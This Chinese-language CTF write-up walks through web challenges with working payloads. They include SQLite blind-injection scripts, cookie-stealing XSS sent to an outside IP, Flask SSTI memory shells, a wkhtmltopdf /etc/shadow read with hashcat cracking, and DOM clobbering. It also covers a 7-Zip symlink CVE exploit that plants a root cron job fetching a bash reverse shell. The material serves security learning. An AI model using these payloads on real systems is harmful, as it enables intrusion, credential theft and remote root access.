    # 1'/**/or/**/(select/**/length(sql)/**/from/**/sqlite_master/**/where/**/name='users')={i}--+
    # 1'/**/or/**/(select/**/length(secret)/**/from/**/users/**/limit/**/1)={i}--+
    payload = f"1'/**/or/**/(select/**/length(secret)/**/from/**/users/**/limit/**/1)={i}--+"
    if check(payload):
        length = i
        break

print("length =", length)

# 开始逐字符盲注
for i in range(1, length + 1):
    for c in chars:
        #1'/**/or/**/substr((select/**/name/**/from/**/sqlite_master/**/limit/**/1),{i},1)='{c}'--+
        #1'/**/or/**/substr((select/**/sql/**/from/**/sqlite_master/**/where/**/name='users'),{i},1)='{c}'--+'
        #1'/**/or/**/substr((select/**/secret/**/from/**/users/**/limit/**/1),{i},1)='{c}'--+'
        payload = f"1'/**/or/**/substr((select/**/secret/**/from/**/users/**/limit/**/1),{i},1)='{c}'--+'"
        if check(payload):
            result += c
            break
    print(result)

print("最终结果 =", result)
```
得到flag`SYC{YourPoem-019aab5b25e37535827bf30d0f56537b}`
用到SQLite 数据库，查询 SQLite 系统表
## Xross The Finish Line
XSS 题。黑名单字符： `const blacklist = ["script", "img", " ", "\n", "error", "\"", "'"]`
绕过策略主要是以下几点： 
- 在标签名后可以使用斜杠 / 代替空格 
-  Javascript ES6 引入的模板字符串使用反引号包裹，可用于避开单双引号的检测 
- 只有script 标签、img 标签和 error 事件不能用，还有许多能用的标签和事件处理器
payload
```
<svg/onload=fetch(`http://121.89.81.39:7777/?=`+document.cookie)></svg>
```
在自己服务器上 nc 监听对应端口（ sudo nc -lvp 7777 ），再点击按钮报告给管理员 Bot，就可 以在自己的服务器上收到 flag 了，也可以用一个[网站](https://requestrepo.com/#/requests)，在网站得到一个域名，再发送
```
<svg/onload=fetch(`https://qp3gj23t.requestrepo.com/`+document.cookie)></svg>
```
得到flag![](/image/124.png)
## 路在脚下
可以发现存在SSTI漏洞，可以发现是SSTI无回显，可以有两种思路，一种是把执行的结果写入static目录下，一种是打内存马，内存马适合不出网的SSTI打法，Flask可以不出网进行内存马添加新路由和修改配置，可以先尝试static目录，因此传入
```
{{url_for.__globals__['__builtins__']['eval']("__import__('os').popen('echo `env` > /app/static/1.txt').read()")}}
```
其中反引号是执行env写入文件,访问`static/1.txt`得到flag,但有另一种解法，就是打内存马，写入
```
{{url_for.__globals__['__builtins__']['eval']("__import__('sys').modules['__main__'].__dict__['app'].before_request_funs.setdefault(None,[]).append(lambda:__import__('os').popen('env').read())")}}
```
还是失败了，可以用http头外带的方法，
```
{{url_for.__globals__.__builtins__.setattr(url_for.__spec__.__init__.__globals__.sys.modules.werkzeug.serving.WSGIRequestHandler,"protocol_version",url_for.__globals__.__builtins__.eval("__import__('os').popen('env').read()"))}}
```
得到flag，或者用添加路由的方式
```
{{().__class__.__base__.__subclasses__()[104].__init__.__globals__.__builtins__.exec("app=__import__('sys').modules['__main__'].__dict__['app'];rule=app.url_rule_class('/shell',endpoint='shell',methods={'GET'});app.url_map.add(rule); app.view_functions['shell']= lambda:__import__('os').popen(__import__('flask').request.args.get('ivory')).read()")}}
```
访问/shell执行命令应该就行了，这是官方wp，但是刚开始复现不成功，想了很久，可能是复现题目环境和原来的不同，从极客群里得到了启发，就写了个脚本专门爆索引值，
```python
import requests  
  
url=input("请输入url:")  
TRUE_TEXT="渲染出来不一样，我不会告诉你任何事情!"  
  
def check(payload):  
    r =requests.get(url,params={"name":payload})  
    # r =requests.post(url,data={"name":payload})  
    return TRUE_TEXT in r.text  
result =""  
chars = r"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ{}_+-*/@!#$%^&()[]=;:,.?<>~`'\" \n\r"  
  
for i in range(500):  
    payload=f"""{{{{().__class__.__base__.__subclasses__()[{i}].__init__.__globals__.__builtins__.exec("app = __import__('sys').modules['__main__'].__dict__['app']; rule = app.url_rule_class('/shell', endpoint='shell', methods=['GET']); app.url_map.add(rule); app.view_functions['shell'] = lambda: __import__('os').popen(__import__('flask').request.args.get('ivory')).read()")}}}}"""  
    if check(payload):  
        print(f"成功了,是{i}")  
        break
```
发现原来索引值变了，变成103了，怪不得之前复制粘贴不成功，这样就可以访问/shell执行命令了。但是不知道为什么直接用hackbar提交一直不成功，但用脚本可以发送成功
，我就又试了一下布尔盲注，看了一下别人的脚本
```python
import requests  
import string  
import time  
import sys  
  
url = "http://8080-cc710451-e263-44c5-882a-4ac47fba88a7.challenge.ctfplus.cn/"  
  
target_file = "/proc/self/environ"  
  
charset = string.ascii_letters + string.digits + "{}_-/:.@=" + " "  
   
  
result = ""  
  
for i in range(0, 500):  
    found = False  
    for char in charset:  
        condition = f"url_for.__globals__[request.args.b][request.args.o](request.args.f).read()[{i}] == '{char}'"  
        payload = "{% if " + condition + " %}{{1/0}}{% endif %}"  
  
        params = {  
            "name": payload,  
            "b": "__builtins__",  
            "o": "open",  
            "f": target_file  
        }  
  
        try:  
  
            # time.sleep(0.05)  
            r = requests.get(url, params=params, timeout=5)  
  
            # 如果返回“渲染出错了”，说明猜对了  
  
            if "渲染出错了" in r.text:  
                result += char  
                print(char, end="", flush=True)  
                found = True  
                break        except Exception as e:  
            pass  
  
    if not found:  
        result += "?"  
        print("?", end="", flush=True)  
```
可以把环境变量爆出来，理论上可以得到flag，但是效率太慢了，爆了半个小时，环境过期了，解释一下其中的代码，
- `url_for` Flask模板框架的路由反转函数，模板可以直接调用。
- `__globals__` 获取url_for函数的全局变量字典，python中所有函数都有这个属性，能拿到函数所在作用域的所有变量和模块。
- `[request.args.b]` request.args是Flask中获取GET请求参数的对象，b对应params里的`b:"__builtins__"`,即全局变量中的python内置模块。
- `[request.args.o]` ,o对应params里的`o:"open"` 即从内置模块中取出文件打开函数open,
- `(request.args.f)` f对应params里的f: target_file，如 `/proc/self/environ`，作为open函数的参数，打开目标文件。
- `.read()`读取打开的文件全部内容（返回字符串)
- `[{i}]`取文件内容字符串的第 `i` 位字符（盲注的核心：逐位验证）
- `== '{char}'`判断该位字符是否等于当前遍历的 `char`
```python
params = {
    "name": payload,  # 注入的核心模板代码
    "b": "__builtins__",  # 传递内置模块名
    "o": "open",          # 传递文件打开函数名
    "f": target_file      # 传递要读取的文件路径
}
```
- 这是**绕过 WAF（网页防火墙）** 的关键设计，而非单纯的语法需求,拆分开是为了绕过防火墙
**自己尝试写了一个更简单的脚本**
```python
import requests  
url = input("请输入url:")  
TRUE_TEXT='渲染出来不一样，我不会告诉你任何事情!'  
  
def check(payload):  
    r =requests.get(url,params={"name":payload})  
    # r =requests.post(url,data={"name":payload})  
    return TRUE_TEXT in r.text  
result =""  
chars = r"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ{}_+-*/@!#$%^&()[]=;:,.?<>~`'\" \n\r"  
  
for i in range(1,500):  
    for c in chars:  
        payload=f"""{{{{ 1/ (1 if config.__class__.__init__.__globals__['os'].popen('ls /').read()[{i}]=='{c}' else 0) }}}}"""  
        if check(payload):  
            result += c;  
            break  
    print(result)  
print(f"最终结果:{result}")
```
又看了另一个师傅的博客，用的是时间盲注，有所启发，试一下
可以试一下`?name={{config.__class__.__init__.__globals__['os'].popen('sleep 5').read() if 1==1 else ''}}`可以发现卡住了五秒，时间盲注有戏。
写一下脚本
```python
import requests  
import time  
  
url=input("请输入url:")  
  
result=""  
chars=r"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_+-*/@!#$%^&()[]=;:,.?<>~`'\" \n\r"  
def check(payload):  
    start_time = time.time()  
    requests.get(url,params={"name":payload},timeout=3)  
    #r=requests.post(url,data={"id":payload},timeout=1)  
    response_time = time.time()-start_time  
    for _ in range(3):#通过增加多次校验（循环 3 次判断延迟）来提升匹配准确性  
        if response_time>=1.9:  
            return 1  
        else:  
            return 0  
  
for i in range(1,500):  
    for c in chars:  
        payload=f"{{{{ config.__class__.__init__.__globals__['os'].popen('sleep 2').read() if  config.__class__.__init__.__globals__['os'].popen('ls /').read()[{i}]=='{c}' else '' }}}}"  
        if check(payload):  
            result += c  
            break  
    print(result)  
print(f"最终结果是{result}")
```
这里只是列了一下根目录，因为听学长说环境变量里没有flag了，但这个脚本是可以运行的。
## Expression
可以猜到密钥是secret,在jwt.io输入抓到的token,再点JWT.Ecoder,![](/image/125.png)在这里可以修改username字段，因为username可以回显，所以可能存在ssti,把username改为`<%= process.env.FLAG %>`自动生成token,抓包粘贴到token放包，得到flag.测试是哪个模板可以用
```
<%= 7*7 %> // EJS 
#{7*7} // Pug 
{{7*7}} // Handlebars
```
## 百年继承
题干提到了属性，那么属于一个python属性污染的题目,Python 中的原型链污染（Prototype Pollution）是指通过修改对象原型链中的属性，对程序的行为产生意外影响或利用漏洞进行攻击的一种技术。
在 Python中，对象的属性和方法可以通过原型链继承来获取。每个对象都有一个原型，原型上定义了对象可以访问的属性和方法。当对象访问属性或方法时，会先在自身查找，如果找不到就会去原型链上的上级对象中查找，原型链污染攻击的思路是通过修改对象原型链中的属性，使得程序在访问属性或方法时得到不符合预期的结果。常见的原型链污染攻击包括修改内置对象的原型、修改全局对象的原型等.
根据提示
```
上校已创建。
上校继承于他的父亲,他的父亲继承于人类
时间流逝：卷入武装起义：命运与战争交织。
时间流逝：抉择时刻：上校需要做出选择（武器与策略）。
上校选择：{"a": "b"}
选择已生效。
事件：上校使用 spear，采取 ambush 策略。世界线变动...
(上校的weapon属性被赋值为spear,tactic属性被赋值为ambush)
时间流逝：宿命延续：行军与退却。
时间流逝：面对行刑队：命运的审判即将到来。
行刑队：开始执行判决。
行刑队也继承于人类
临死之前,上校目光瞄着行刑队的佩剑,上面分明写着：
lambda executor, target: (target.__del__(), setattr(target, 'alive', False), '处决成功')
这是人类自古以来就拥有的execute_method属性...
处决成功
时间流逝：结局：命运如沙漏般倾泻……
```
可以看到一个继承关系 上校->父亲->人类，所以要从上校穿越到基类（人类），需要两个`__base__`,因为提示execute_method是字符串，所以猜测可能会把execute_method执行，根据各个阶段的内容可知lambda executor, target:只有第三个参数会回显，前两位无所谓，可以用11占位就行了，所以可以构造payload为
`{"__class__":{"__base__":{"__base__":{"execute_method":"lambda executor,target:(1,1,__import__('os').getenv('FLAG'))"}}}}`  ，其中，lambda是python定义匿名函数的关键字，`executor, target`是函数的**两个形参**，这样就得到flag
## PDF Viewer
生成的pdf用浏览器查看一下属性，看到![](/image/126.png)用的是wkhtmltopdf 组件,这个组件的漏洞可以实现任意文件读取，可以构造payload
```
<script>
    x= new XMLHttpRequest();
    x.onload = function(){
        document.write(this.responseText)
    };
    x.open("GET","file:///etc/shadow")
    x.send();
</script>
```
解释一下，其中
- `x= new XMLHttpRequest();`作用是初始化一个用于发起 HTTP/HTTPS 请求的对象
- `x.onload = function()`给对象 `x` 绑定请求成功完成后的回调函数。其中onload是XHR(XMLHttpRequest)对象的成功回调事件，当请求成功完成时触发。
- `document.write(this.responseText)` 其中this指向x,responseText,XHR对象的核心属性，存储服务器返回的文本格式响应数据，document是浏览器内置的文档对象，代表当前HTML页面，write是document的方法，作用是将内容直接写入当前页面的HTML流中。
- `x.open("GET","file:///etc/shadow")` ，open是XHR的核心方法，初始化请求配置。"GET"请求方法用于读取资源，利用file://伪协议读取文件。
- `x.send();`真正发起请求。
这样就可以得到/etc/shadow文件内容![](/image/127.png)在管理员登录界面的源码里有一句提示`<!--提示：使用linux系统本地账户尝试登录。-->`但是用户名得到了，但密码是哈希加密后的，这种加密是不可逆的，只可以爆破，不可以破解，可以用kali的hashcat爆破，创建一个文件hash.txt里面写入`WeakPassword_Admin:$1$wJOmQRtK$Lf3l/z0uT/EAsFm3vQkuf.:20398:0:99999:7:::`再执行指令`hashcat -m 500 hash.txt /usr/share/wordlists/rockyou.txt --force`利用GPU加速，效率高，其中-m 500 指定算法为MD5加密。![](/image/128.png)最终得到密码为`qwerty`,登录即可得到flag
## Xross The Doom
附件里最重要的就是/public/js/admin.js文件了，打开源码，代码审计
```javascript
const id = location.pathname.split('/').pop();//按/分割当前路径得到最后一段，得到文章id
const contentEl = document.getElementById('content');//这两行获取用于展示内容和源信息的DOM元素
const metaEl = document.getElementById('meta');
```

```js
fetch(`/api/posts/${id}`)//向后端发送 GET 请求，获取 ID 对应的文章数据；
  .then(r => r.json())//将响应体解析为 JSON 格式；
  .then(({ post }) => {//解构赋值取出返回数据中的 `post对象（文章主体）；
    // 成功获取数据后的逻辑
  })
  .catch(() => {
    contentEl.textContent = '未找到内容';
  });//请求失败（比如 ID 不存在、接口报错）时，在内容区域显示 “未找到内容”。
```

```javascript
metaEl.textContent = `创建时间：${new Date(post.createdAt).toLocaleString()}`;
const safe = DOMPurify.sanitize(post.content);
contentEl.innerHTML = safe;
```
第一行将文章的创建时间（`post.createdAt` 是时间戳 / 字符串）转为本地格式（比如 `2025/12/14 10:00:00`），渲染到元信息区域； `DOMPurify.sanitize(post.content)`：对文章内容（富文本，含 HTML）做 XSS 过滤，清除恶意脚本；将过滤后的安全内容渲染到内容区域.
```js
function asBool(v) { return v === true || (v && typeof v === 'object' && 'value' in v ? v.value === 'true' : !!v); } function asPath(v) { if (typeof v === 'string') return v; if (v && typeof v.getAttribute === 'function' && v.getAttribute('action')) { return v.getAttribute('action'); } if (v && v.action) return v.action; return ''; }
```
工具函数`asBool(v)`：将任意值转为布尔值，兼容特殊场景，`asPath(v)`：将任意值转为路径字符串，兼容多种输入，
```js
const auto = asBool(window.AUTO_SHARE); 
const path = asPath(window.CONFIG_PATH); 
const includeCookie = asBool(window.CONFIG_COOKIE_DEBUG);
```
从全局变量读取配置
```js
function buildTarget(base, sub) { const parts = (base + '/' + (sub || '')).split('/'); const stack = []; for (const seg of parts) { if (seg === '..') { if (stack.length) stack.pop(); } else if (seg && seg !== '.') { stack.push(seg); } } return '/' + stack.join('/'); }
```
路径拼接函数，解决`../`和`/.`的问题，这就给了 DOM Clobbering 操纵变量控制 Bot 将 Cookie 发送到 /log 接口的机会（ /log 接口会 获取 Cookie 并存储，而 /logs 接口可以查看 log 数据）。每次次访问会记录`ua`头和`cookie`（这里是把请求`/log?c=`的get请求c的值作为cookie），传参/log?c=test而`/logs`返回所有的`log`，可以看到回显![](/image/129.png)`/bot`路由相对于模拟admin访问`/admin/review/:id`审核从而触发xss,把`document.cookie`作为c的值需要3个条件,
```js
const auto = asBool(window.AUTO_SHARE);  
const path = asPath(window.CONFIG_PATH);  
const includeCookie = asBool(window.CONFIG_COOKIE_DEBUG);
```

```
window.AUTO_SHARE 是 DOM 元素（如 <div id="AUTO_SHARE">1</div>）  
那么：  
v === true → ❌ false  
v && typeof v === 'object' → ✅ true（DOM 元素是 object）  
'value' in v → ❌ false（<div> 没有 value 属性）  
所以走三元表达式的 else 分支：!!v  
而 !!window.AUTO_SHARE === !!1 ===true
```

```js
function asPath(v) {  
// 1. 如果是字符串，直接返回  
if (typeof v === 'string') return v;  
  
// 2. 如果 v 存在，且有 getAttribute 方法，并且有 action 属性  
if (v && typeof v.getAttribute === 'function' && v.getAttribute('action')) {  
return v.getAttribute('action');  
}  
// 3. 如果 v 存在，且有 action 属性（可能是对象属性）  
if (v && v.action) return v.action;  
// 4. 默认返回空字符串  
return '';  
}
```

```js
✅ 第1个条件：typeof v === 'string'？  
❌ 否，v 是 DOM 对象 → 跳过。  
✅ 第2个条件：  
v 存在 → ✅  
typeof v.getAttribute === 'function' → ✅（DOM 元素有 .getAttribute()）  
v.getAttribute('action') → 返回 "../log"（字符串，truthy）→ ✅  
✅ 所以 第2个条件成立，函数返回：../log
```
payload 不被`DOMPurify` 拦截，因为不存在xss攻击
```html
<div id="AUTO_SHARE">1</div>  
<div id="CONFIG_COOKIE_DEBUG">1</div>  
<img id="CONFIG_PATH" action="../log">
```
发布的公告内容里写这个，![](/image/133.png)
根据server.js里的代码
```js
app.post('/api/posts', (req, res) => {
  const { title, content } = req.body;
  if (!title || !content) return res.status(400).json({ error: 'Missing title or content' });
  const id = nanoid(8);
  const sanitized = DOMPurify.sanitize(String(content));
  const post = { id, title: String(title), content: sanitized, createdAt: Date.now() };
  posts.push(post);
  res.json({ ok: true, id });
});
```
可以看到帖子id的生成逻辑，但是可以自动化得到id,但是也可以直接访问/api/posts接口得到id![](/image/130.png)
得到id后访问`/bot?id=ObyLOWSl`![](/image/131.png)再访问logs得到flag![](/image/132.png)
### 题目总结
网页功能
-  用户可提交帖子（`/api/posts`），帖子内容会被 `DOMPurify` 净化（防 XSS）；
-  管理员 Bot（`/bot` 路由）会模拟访问 `/admin/review/:id` 审核帖子；
```js
const safeId = encodeURIComponent(id);
const targetUrl = `${serverOrigin}/admin/review/${safeId}`;
```
-  `/log` 路由会记录 `?c=` 参数值 + UA 头，`/logs` 可查看所有记录；
```js
app.get('/log', (req, res) => { 
// 1. 提取 GET 请求中 `c` 参数的值（无则为空字符串） 
const c = req.query.c || ''; 
// 2. 提取请求头中的 User-Agent（客户端标识，无则为空） 
const ua = req.headers['user-agent'] || ''; 
// 3. 将日志条目推入全局 logs 数组（核心：存储数据） 
logs.push({ time: new Date().toISOString(), // 记录当前时间（ISO格式） 
cookie: c, // 把 `c` 参数值存为 `cookie` 字段 
ua // 把 UA 头存为 `ua` 字段（ES6 简写，等价于 ua: ua） 
}); 
// 4. 返回 JSON 响应，告知请求成功 
res.json({ ok: true }); });
app.get('/logs', (req, res) => { 
// 直接返回包含所有日志的 JSON（logs 是全局数组） 
res.json({ logs }); });
```
-  管理员页面（`admin.js`）会根据 `window` 上的全局变量（`AUTO_SHARE`/`CONFIG_PATH`/`CONFIG_COOKIE_DEBUG`）自动发起请求，甚至携带 `document.cookie`
```js
const auto = asBool(window.AUTO_SHARE);
const path = asPath(window.CONFIG_PATH);
const includeCookie = asBool(window.CONFIG_COOKIE_DEBUG);
if (auto) { const target = buildTarget('/analytics', path); 
const qs = new URLSearchParams({ id, ua: navigator.userAgent }); 
if (includeCookie) { qs.set('c', document.cookie); // 关键：携带document.cookie 当 `includeCookie` 为 `true` 时，会把 `document.cookie` 作为 `c` 参数拼到请求 URL 中。
} 
fetch(target + '?' + qs.toString()).catch(() => {}); 
}//`fetch(...)` 是浏览器发起 HTTP 请求的 API，只要进入这个 `if` 分支，就会无感知发起请求；
```
**攻击实现原理**：利用 Bot 访问审核页面时的「DOM 变量污染」，让 Bot 自动发起请求到 `/log`，并将管理员的 `document.cookie`（含 FLAG）作为 `c` 参数提交，最终通过 `/logs` 读取 FLAG。利用了**函数asBool**的逻辑问题，对DOM元素的兼容过宽
```js
function asBool(v) { return v === true || (v && typeof v === 'object' && 'value' in v ? v.value === 'true' : !!v); }
```
拆解一下
```js
return v === true // 分支1：严格等于true → 返回true 
|| // 逻辑或：分支1不满足则走分支2 
( // 分支2：复杂判断（三元表达式） 
v && typeof v === 'object' && 'value' in v // 三元条件,必须全部满足才会走三元的 ?分支：
? v.value === 'true' // 条件满足：判断value属性是否为'true' 
: !!v // 条件不满足：返回v的布尔等价物 
);
```
`v` 不是 `null/undefined/false/0/''` 等 “假值”,`v` 的类型是 `object`（注意：DOM 元素、数组、普通对象的 `typeof` 都是 `object`）,`v` 这个对象上存在 `value` 属性,DOM元素满足前两个，但是DOM里没有value属性，所以走!!v的分支，所以只要元素存在，`!!v` 就是 `true`），
**结论**：只要页面中有 `<div id="AUTO_SHARE">`，`auto` 就会是 `true`（触发请求）；同理，`<div id="CONFIG_COOKIE_DEBUG">` 会让 `includeCookie` 为 `true`（携带 Cookie）。
**`asPath`**：
```js
function asPath(v) { // 分支1：如果v是字符串 → 直接返回（最标准的场景） 

	if (typeof v === 'string') return v; // 分支2：`v` 这个对象有 `getAttribute` 方法，且该方法是一个函数（DOM 元素的核心特征）如果v是DOM元素（有getAttribute方法）且有action属性 → 返回action属性值 
	if (v && typeof v.getAttribute === 'function' && v.getAttribute('action')) { return v.getAttribute('action'); } 
	// 分支3：如果v是普通对象且有action属性 → 返回action属性值 
	if (v && v.action) return v.action; // 兜底：以上都不满足 → 返回空字符串 
	return ''; }
```
**buildTarget**:路径处理函数，在本题中，给 `action` 属性填 `../log` 的核心目的是：**利用 `buildTarget` 函数的路径解析规则，把原本指向 `/analytics` 的请求，精准重定向到记录 Cookie 的 `/log` 路由**。
```js
function buildTarget(base, sub) { 
	const parts = (base + '/' + (sub || '')).split('/'); 
	const stack = []; //初始化栈， 栈（`stack`）是 “先进后出” 的数组，用来存储最终的合法路径片段，是处理 `../` 的关键。
	for (const seg of parts) { 
		if (seg === '..') { 
			if (stack.length) stack.pop(); 
			} else if (seg && seg !== '.') 
			{ stack.push(seg); } } 
	return '/' + stack.join('/'); }
```
`admin.js` 中调用 `buildTarget` 时，`base` 参数是固定写死的 `/analytics`
```javascript
const target = buildTarget('/analytics', path); // base = '/analytics'，path = action属性值
```
如果攻击者给 `action` 填普通值（比如 `log`），`buildTarget` 会解析为 `/analytics/log`（这是不存在的路由，无法记录 Cookie）；
只有填 `../log`，才能通过 `buildTarget` 的路径解析规则，“抵消” 掉 `/analytics`，最终指向根目录下的 `/log`。
`../` 在路径中表示「返回上一级目录」
- 原始拼接路径：`/analytics/../log`
- `split('/')`：按 `/` 分割成数组 → `parts = ["", "analytics", "..", "log"]`；（注：开头的空字符串是因为 `/analytics` 以 `/` 开头，分割后第一个元素为空）。
```javascript
for (const seg of parts) { if (seg === '..') { 
// 遇到 ../：如果栈不为空，弹出最后一个元素（返回上一级） 
	if (stack.length) stack.pop(); } 
	else if (seg && seg !== '.') { 
	// 遇到有效片段（非空、非 .）：压入栈 
	stack.push(seg)
	; } // 忽略两种情况：seg === '.'（当前目录）、seg === ''（空字符串） }
```
- 我们逐一遍历 `parts = ["", "analytics", "..", "log"]`：
- `""`空字符串->忽略
- `analytics`有效片段->压入栈
- `..`遇到`..`栈不为空 → 弹出最后一个元素(返回上一级)
- `log`有效片段->压入栈
```js
return '/' + stack.join('/');
```
-  `stack.join('/')`：将栈内元素用 `/` 拼接 → `"log"`；
- 开头加 `/` → 最终返回 `/log`(正好是我要的路径)
**最终攻击链**：用户提交含「DOM 变量污染 payload」的帖子 → 调用 `/bot` 触发管理员 Bot 访问审核页面 → Bot 执行 `admin.js`，污染 `window` 全局变量 → 自动发起 `/log?c=管理员Cookie` 的请求 → 攻击者访问 `/logs` 读取 Cookie 中的 FLAG。
## 77777_time_Task
题目给了源码
```python
import os  
from flask import Flask, jsonify, request  
import subprocess  
  
app = Flask(__name__)  
UPLOAD_DIR="./uploads"  
os.makedirs(UPLOAD_DIR, exist_ok=True)  
@app.route("/", methods=["GET"])  
def index():  
    return "Hello World"  
  
  
@app.route("/upload", methods=["POST"])#定义路由，post访问/upload时触发，  
def upload():  
    if 'file' not in request.files:#检查请求中是否包含文件字段  
        return jsonify({"status": "error", "message": "No file part"}), 400  
    #获取上传的文件对象  
    file = request.files['file']  
    #处理文件名为空的情况  
    if file.filename == '':  
        return jsonify({"status": "error", "message": "No selected file"}), 400  
    #简单的文件名过滤，只过滤了..和/,过滤不彻底  
    sanitizeFilename=file.filename.replace("..", "").replace("/","")  
    ext=sanitizeFilename.split(".")[-1]#按点分割，取最后一段为扩展名  
    if ext != "7z":#检查文件扩展名是否为7z  
        return jsonify({"status": "error", "message": "Only .7z files are allowed"}), 400  
    filepath = os.path.join(UPLOAD_DIR, file.filename)#用原始文件名拼接，而非过滤后的  
    file.save(filepath)#将上传文件保存到指定路径  
  
    ret=subprocess.run(["/tmp/7zz", "x", #执行7zz解压命令，x表示解压  
                        filepath],  
                       shell=False,#非shell模式，防止命令注入  
                       stdout=subprocess.PIPE,#捕获标准输出  
                       stderr=subprocess.PIPE)#捕获标准错误  
    #检查解压是否成功，非零表示失败  
    if ret.returncode != 0:  
        return jsonify({"status": "error", "message": "Failed to extract .7z file", "detail": ret.stderr.decode()}), 500  
    return jsonify({"status": "success", "filename": file.filename})#解压成功返回结果  
  
@app.route("/listfiles", methods=["GET"])  
def list_files():  
    dir=request.args.get("dir", "./uploads")#捕获url参数dir,默认值是./uploads  
    files = os.listdir(dir)#列出指定目录下的所有文件/子目录  
    return jsonify({"files": files})#返回json格式的内容  
  
  
  
if __name__ == "__main__":  
    app.run(host="0.0.0.0", port=3000, debug=False)
```
用CVE-2025-55188+定时任务，首先在自己的服务器建立一个文件夹`mkdir -p /tmp/exp && cd /tmp`避免与其他文件冲突，再编写反弹shell脚本
```bash
cat > ppp << 'EOF'
bash -i >& /dev/tcp/121.89.81.39/9999 0>&1
EOF
```
写上公网ip和要nc监听的端口如9999，再执行`chmod +x ppp`赋予文件执行权限，接下来在/tmp/exp下启动http服务，`python3 -m http.server 7777`监听端口与下面.sh文件中定义的一致，保持这个监听端口开启，测试一下访问`http://121.89.81.39:7777`若可以下载ppp文件就可以了。
再开一个新的窗口，nc监听9999`nc -lvvp 9999` 保持窗口打开。再新开一个窗口
接下来生成恶意7z文件，在/tmp/exp目录下创建exp.sh文件，执行
```bash
cat > exp.sh << 'EOF'
#!/bin/bash
olddir="$(pwd)"
tempdir="$(mktemp -d)"
cd "$tempdir"

mkdir -p a/b
ln -s /a a/b/link
7zz a arb_write.7z a/b/link -snl

ln -s a/b/link/../../etc/cron.d link
7zz a arb_write.7z link -snl
rm link

mkdir link

echo '* * * * * root wget -O /tmp/ppp http://121.89.81.39:7777/ppp && bash /tmp/ppp' > link/pwn
7zz a arb_write.7z link/pwn
cp arb_write.7z "$olddir"
cd "$olddir"
rm -r "$tempdir"
EOF
```
再`chmod +x exp.sh`,再执行脚本`./exp.sh`,7z文件生成成功后，接下来就可以上传到题目环境了，执行脚本`python3 upload.py`
```python
import requests

url = "http://3000-5a716ca0-7069-4da8-90a7-57cce825a0e5.challenge.ctfplus.cn/upload"
# 上传文件（file字段对应源码的request.files['file']）
files = {"file": open("arb_write.7z", "rb")}
response = requests.post(url, files=files)
print(response.text)
```
回显`{"filename":"arb_write.7z","status":"success"}`说明文件上传到服务器了，目标的`/etc/cron.d/pwn`定时任务是**每分钟执行一次**，所以等待大概一分钟就可以在nc的监听拿到shell了，![](/image/134.png)
### 题目总结
- CVE-2025-55188 核心原理：7-Zip 在处理含符号链接（软链接）的 7z 文件时，开启`-snl`（保存符号链接而非目标文件）参数后，解压会**递归解析符号链接的真实路径**，且对`../`等路径遍历字符过滤失效 —— 即使 7-Zip 被限制在`./uploads`目录解压，也能通过构造嵌套符号链接，将文件写入`/etc/cron.d`等任意系统目录。
- 源码中的缺陷：仅用`replace("..", "").replace("/","")`过滤，但最终保存用`file.filename`（原始文件名）和 直接执行`/tmp/7zz x 上传文件`，未指定解压目录（默认解压到当前目录 / 符号链接指向的目录） `/listfiles`接口直接接收`dir`参数，调用`os.listdir(dir)`
- `/etc/cron.d`是系统级定时任务目录，**每分钟自动扫描**其中的文件，该目录下的任务默认以`root`权限执行， 任务格式为`分 时 日 月 周 用户 命令`，`* * * * *`表示 “每分钟执行一次”。
解释反弹shell脚本
```bash
cat > ppp << 'EOF'
bash -i >& /dev/tcp/121.89.81.39/9999 0>&1
EOF
```
**原理**：利用 Linux bash 的`/dev/tcp`虚拟文件系统（将网络连接抽象为文件操作），实现 “反向连接”。其中
- `bash -i` 启动交互式bash终端，有交互才能输入命令控制目标。
- `>& /dev/tcp/121.89.81.39/9999`将bash的标准输出和标准错误重定向到服务器9999端口
- `0>&1` 将bash的标准输入绑定到同一TCP连接，使输入的命令能传给目标执行。
- `EOF`(end of file)是文件结束符，可以一次性写入多行内容到文件，无需逐行输入或转义特殊字符。
- 目标服务器执行此脚本会自动连接我的服务器，把root权限的bash终端反弹给我。
**启动http服务的原因：
- Python 的`http.server`模块会在当前目录（`/tmp/exp`）启动一个简易 HTTP 服务器，端口 7777；
- 是为了让目标服务器访问这个http服务器时，自动下载我的ppp文件（即反弹shell脚本）。
**启动nc监听：
- `nc`（netcat）是网络工具，`-l`（监听模式）+`-v`（详细输出）+`-p`（指定端口），监听 9999 端口。
- 目的是为了接受到目标服务器的shell。
**编写`exp.sh`生成恶意 7z 文件（核心漏洞利用）**
.sh文件本质上就是一堆linux指令，执行.sh文件会把里面的所有指令依次执行
```bash
#!/bin/bash    
olddir="$(pwd)"  #保存当前目录（后续复制7z文件回此目录）
tempdir="$(mktemp -d)"  #创建随机临时目录
cd "$tempdir"  #进入临时目录，所有操作在此完成

mkdir -p a/b  #创建嵌套目录a/b，作为层级跳板
ln -s /a a/b/link  #软链接，a/b/link -> /a(根目录下的空目录，仅作路径拼接)
/usr/local/bin/7zz a arb_write.7z a/b/link -snl #打包符号链接，-snl=保存符号链接本身，我的7zz在/usr/local/bin/7zz里

ln -s a/b/link/../../etc/cron.d link  #软链接，link -> a/b/link/../../etc/cron.d
/usr/local/bin/7zz a arb_write.7z link -snl  #追加打包符号链接
rm link  #删除临时软链接，避免冲突

mkdir link  #创建路径link(替代之前的软链接)
#写入定时任务，每分钟下载ppp并执行（root权限）
echo '* * * * * root wget -O /tmp/ppp http://121.89.81.39:7777/ppp && bash /tmp/ppp' > link/pwn
/usr/local/bin/7zz a arb_write.7z link/pwn #追加打包定时任务文件
cp arb_write.7z "$olddir" #复制7z文件回原目录
cd "$olddir" #回到原目录
rm -r "$tempdir" #删除临时目录，无痕迹
```
开头的`#!/bin/bash`是必须写的，本质是告诉 Linux 系统：“执行这个脚本时，必须调用 `/bin/bash` 这个解释器来解析执行脚本里的命令”，之所以`a/b/link/../../etc/cron.d`用两个`../`是因为`a/b/link -> /a`变为`/a/../../etc/cron.d`,其中一个`../`可以让他回到根目录，之所以写两个是因为他会`file.filename.replace("..", "").replace("/","")`,相当于双写绕过了。
- `link/pwn`是真实文件，内容为 “每分钟下载并执行 ppp 脚本”；
- 7-Zip 解压时，会将`pwn`文件写入`/etc/cron.d`（软链接指向的目录），成为系统级定时任务。
